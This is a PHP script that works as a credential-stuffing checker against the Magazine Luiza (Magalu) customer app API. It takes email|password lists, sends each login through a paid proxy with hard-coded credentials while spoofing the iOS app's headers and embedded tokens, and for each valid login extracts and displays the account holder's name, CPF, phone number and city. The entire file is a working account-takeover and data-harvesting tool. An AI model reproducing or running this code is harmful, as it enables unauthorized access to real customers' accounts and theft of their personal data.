
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://magalu-app.luizalabs.com/v1/customer/available?email='.trim(urlencode($email)).'');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: magalu-app.luizalabs.com',
'Connection: keep-alive',
'os-version: 12.5.4',
'Accept: */*',
'version: 6.36.0',
'User-Agent: MagaluApp/6.36.0 (br.com.magazineluiza; build:2; iOS 12.5.4) Alamofire/5.2.2',
'Accept-Language: pt-BR;q=1.0',
'Authorization: Bearer TDo1E4dscUJEaeZdcr1gz9YcvA8h',
'Accept-Encoding: gzip',
	));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$data = curl_exec($ch);
echo $data;







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://magalu-app.luizalabs.com/v2/oauth/token'); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: magalu-app.luizalabs.com',
  'Accept: */*',
  'version: 6.35.0',
  'Authorization: Basic aHA1RTFhYk11RlpzS3VGYnBYTkNndm5JMkVrbGdlbFk6REszWG5iWFVQd3VhSXB3Ug==',
  'Accept-Encoding: gzip, deflate',
  'Accept-Language: pt-BR;q=1.0',
  'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
  'User-Agent: MagaluApp/6.35.0 (br.com.magazineluiza; build:1; iOS 12.5.4) Alamofire/5.2.2',
  'Connection: close',
  'session_id: f3a590741016496c9fee3c1c26163e61',
  'os-version: 12.5.4',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'grant_type=password&password='.$senha.'&scope=LOGIN&username='.trim(urlencode($email)).'');
$d1 = curl_exec($ch);

$customer_id = getStr($d1, '"customer_id":"', '",');
$access_token = getStr($d1, '"access_token":"', '",');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://magalu-app.luizalabs.com/v1/customers/'.$customer_id.'');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: magalu-app.luizalabs.com',
  'Connection: close',
  'os-version: 12.5.4',
  'Accept: */*',
  'version: 6.35.0',
  'User-Agent: MagaluApp/6.35.0 (br.com.magazineluiza; build:1; iOS 12.5.4) Alamofire/5.2.2',
  'Accept-Language: pt-BR;q=1.0',
  'Authorization: Bearer '.$access_token.'',
  'Accept-Encoding: gzip, deflate',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d2 = curl_exec($ch);



$nome = getStr($d2, '"name":"', '"');
$cpf_cnpj = getStr($d2, '"cpf_cnpj":"', '",');
$cidade = getStr($d2, '"city":"', '",');
$estado = getStr($d2, '"state":"', '",');
$cell_phone_area_code = getStr($d2, '"cell_phone_area_code":"', '",');
$cell_phone = getStr($d2, '"cell_phone":"', '"');


     if(stristr($d1,'Sorry for the trouble') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$nome.' | CPF: '.$cpf_cnpj.' | Telefone: '.$cell_phone_area_code.''.$cell_phone.' | Cidade: ' .$cidade.'('.$estado.') <strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{
        echo '               
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Return → '.$d1.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';

}

curl_close($ch);
 ob_flush();        
                             
?>
